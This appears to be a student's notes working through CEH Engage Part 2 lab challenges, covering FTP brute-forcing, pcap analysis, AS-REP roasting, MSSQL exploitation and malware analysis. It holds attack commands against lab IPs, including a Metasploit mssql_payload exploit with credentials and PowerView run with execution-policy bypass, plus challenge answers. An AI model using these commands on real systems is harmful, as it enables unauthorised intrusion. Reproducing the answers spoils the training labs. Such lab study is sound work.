Part 2 of CEH Engage covers System Hacking, Malware Threats, Sniffing, Social Engineering, and Denial-of-Service modules. In this part, you must exploit vulnerabilities identified in the last part and use various network/system/human exploitation techniques to gain access to the target's systems. You have to perform lateral and vertical privilege escalations and install malicious apps and utilities to maintain access and clear logs to avoid detection. You will need to create and use malicious applications against the target and will also be required to analyze any malware discovered on any of the targets. You need to note all the information discovered in this part of the CEH Engage and proceed to the subsequent phases of the ethical hacking cycle in the next part of the CEH Engage.

what parrot os cli command to perform brute-force attack on linux machine from 192.168.10.0/24 and crack FTP credentials of user nick

**Challenge 1**:

You are assigned to perform brute-force attack on a linux machine from 192.168.10.0/24 subnet and crack the FTP credentials of user nick. An exploitation information file is saved in the home directory of the FTP server. Determine the Vendor homepage of the FTP vulnerability specified in the file. (Format: aaaaa://aaa.aaaaaaaa.aaa/)

sudo nmap -p 21 --open -O -sSV 192.168.10.0/24 -oN ftp

![[Pasted image 20251012214806.png]]

![[Pasted image 20251011102830.png]]

ftp ftp://nick@192.168.10.111

![[Pasted image 20251012214703.png]]

**Challenge 2**:

An intruder performed network sniffing on a machine from 192.168.10.0/24 subnet and obtained login credentials of the user for moviescope.com website using remote packet capture in wireshark. You are assigned to analyse the Mscredremote.pcapng file located in Downloads folder of EH Workstation-1 and determine the credentials obtained. (Format: aaaa/aaaaa)

filter : http
ctrl + f : string to search "pwd"
![[Pasted image 20251012215128.png]]
kety/apple

**Challenge 3**:

You are assigned to analyse a packet capture file ServerDoS.pcapng located in Downloads folder of EH Workstation-2 machine. Determine the UDP based application layer protocol which attacker employed to flood the machine in targeted network. Note: Check for target Destination port. (Format: Aaaaa Aaaaaaa Aaaaaaaa)

![[Pasted image 20251009184600.png]]

UDP port 26000
Quake Network Protocol

**Challenge 4**:

A severe DDoS attack is occurred in an organization, degrading the performance of a ubuntu server machine in the SKILL.CEH network. You are assigned to analyse the DD_attack.pcapng file stored in Documents folder of EH workstation -2 and determine the IP address of the attacker trying to attack the target server through UDP. (Format: NNN.NNN.NN.NNN)

statistics - conversation

go to udp tab

find out attacker ip address

192.168.10.144
![[Pasted image 20251012215811.png]]



**Challenge 5**:

You are assigned to analyse PyD_attack.pcapng file stored in Downloads folder of EH Workstation -2 machine. Determine the attacker IP machine which is targeting the RPC service of the target machine. (Format: NNN.NN.NN.NN)

filter: tcp.dstport == 135

attacker IP : 172.30.10.99

![[Pasted image 20251012215311.png]]

**Challenge 6**:

An incident handler identified severe DDoS attack on a network and provided report using Anti-DDoS Guardian tool. You are assigned to analyse the reports submitted by the IH team which are stored in "C:\Users\Admin\Documents\Anti-DDoS" directory of the EH Workstation-1 and determine the attacker IP which has transmitted more number of packets to the target machine. (Format: NNN.NNN.NN.NNN)

192.168.10.222

![[Pasted image 20251012220029.png]]

**Challenge 7**:

You are assigned to analyse the domain controller from the target subnet and perform AS-REP roasting attack on the user accounts and determine the password of the vulnerable user whose credentials are obtained. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: aNaaN*NNN)

![[Pasted image 20251012223259.png]]

domain server : 192.168.0.222

![[Pasted image 20251012223437.png]]
![[Pasted image 20251011165248.png]]





**Challenge 8**:

A client machine under the target domain controller has a misconfigured SQL server vulnerability. Your task is to exploit this vulnerability, retrieve the MSS.txt file located in the Public Downloads folder on the client machine and determine its size in bytes as answer. Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: N)

![[Pasted image 20251014083959.png]]

![[Pasted image 20251014082011.png]]
![[Pasted image 20251014152628.png]]

![[Pasted image 20251014153640.png]]
check xp_cmdshell value is 1 to make sure enabled

run msfconsole

![[Pasted image 20251014153540.png]]

execute
use exploit/windows/mssql/mssql_payload
set RHOST 192.168.10.144
set USERNAME Server_mssrv
set PASSWORD Spidy
set DATABASE msdb
exploit

![[Pasted image 20251014153916.png]]
![[Pasted image 20251014153937.png]]
![[Pasted image 20251014154001.png]]

![[Pasted image 20251014154050.png]]
![[Pasted image 20251014154123.png]]
![[Pasted image 20251014154229.png]]

![[Pasted image 20251014154311.png]]

ANSWER: 7

![[Pasted image 20251014154343.png]]


/root/ADtools/PowerView.ps1

python3 -m http.server

open browser to access "http://ip:8000"
download "PowerView.ps1"

powershell -EP Bypass
. .\PowerView.ps1
Get-NetComputer

OR

powershell
Import-Module ActiveDirectory
Get-ADComputer -Filter *
![[Pasted image 20251014114924.png]]

![[Pasted image 20251014150225.png]]

![[Pasted image 20251014150811.png]]
![[Pasted image 20251014150858.png]]


![[Pasted image 20251014082054.png]]

![[Pasted image 20251014082150.png]]
https://www.reddit.com/r/CEH/comments/1mpb4mg/how_to_solve_the_challenge_in_ceh_engage_with_0/

![[Pasted image 20251013000017.png]]
cehv13 lab manual page 286

https://www.reddit.com/r/CEH/comments/1mpb4mg/how_to_solve_the_challenge_in_ceh_engage_with_0/

![[Pasted image 20251012234743.png]]


![[Pasted image 20251012222156.png]]

![[Pasted image 20251012223216.png]]

![[Pasted image 20251011130017.png]]

![[Pasted image 20251012224255.png]]

![[Pasted image 20251011130150.png]]

**Challenge 9**:

You are assigned to crack RDP credentials of user Maurice from the target subnet 192.168.10.0/24 and determine the password as answer. Note: use Note: use users.txt and rockyou.txt files stored in attacker home directory while cracking the credentials. (Format: Aaaaaaa@NNNN)
![[Pasted image 20251011125653.png]]

![[Pasted image 20251011125754.png]]

**Challenge 10**:

You are assigned to perform malware scanning on a malware file Tools.rar stored in Downloads folder of EH workstation-2 machine and determine the last four digits of the file’s SHA-256 hash value. (Format: aNNN)
![[Pasted image 20251011125346.png]]


**Challenge 11**:

You are assigned to monitor a suspicious process running in a machine whose log file Logfile.PML is saved in Pictures folder of the EH Workstation -2. Analyse the logfile and determine the Parent PID of the malicious file H3ll0.exe process from the log file. (Format: NNNN)

![[Pasted image 20251013002242.png]]

![[Pasted image 20251013001941.png]]

![[Pasted image 20251013002331.png]]

**Challenge 12**:

You are tasked with analyzing the ELF executable file named Tornado.elf, located in the Downloads folder of EH Workstation-2. Determine the entropy value of the file up to two decimal places. (Format: N*NN)
![[Pasted image 20251012123833.png]]

![[Pasted image 20251012123858.png]]

![[Pasted image 20251012123946.png]]


![[Pasted image 20251012124043.png]]


**Challenge 13**:

You are assigned to scan the target subnets to identify the remote packet capture feature that is enabled to analyse the traffic on the target machine remotetly. Scan the target subnets and determine the IP address using rpcap service. (Format: NNN.NNN.NN.NNN)

rpcap port : 2002

![[Pasted image 20251013144005.png]]


![[Pasted image 20251013143929.png]]

**Challenge 14**:

An insider attack occurred in an organization and the confidential data regarding an upcoming event is sniffed and encrypted in a image file stealth.jpeg stored in Desktop of EH Workstation -2 machine. You are assigned to extract the hidden data inside the cover file using steghide tool and determine the tender quotation value. (Use azerty@123 for passphrase) (Format: NNNNNNN)

![[Pasted image 20251013002659.png]]

![[Pasted image 20251013002725.png]]
**Challenge 15**:

Perform vulnerability search using searchsploit tool and determine the path of AirDrop 2.0 vulnerability. (Format: aaaaaaa/aaa/NNNNN.a)

![[Pasted image 20251013145958.png]]

![[Pasted image 20251013145926.png]]

![[Pasted image 20251013145904.png]]
